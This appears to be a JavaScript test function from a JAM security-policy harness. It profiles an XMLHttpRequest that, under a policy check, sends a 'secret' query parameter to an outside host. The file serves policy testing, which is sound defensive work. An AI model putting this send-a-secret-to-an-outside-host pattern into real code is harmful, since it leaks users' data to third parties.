function runTest() {

  JAM.startProfile('load');
  var x=XMLHttpRequest();JAM.call(x.open,x,["GET","http://www.blackoutjack.com?secret=1"],JAM.policy.p1)

  JAM.stopProfile('load');

  return "RESULT NOT SPECIFIED";
}
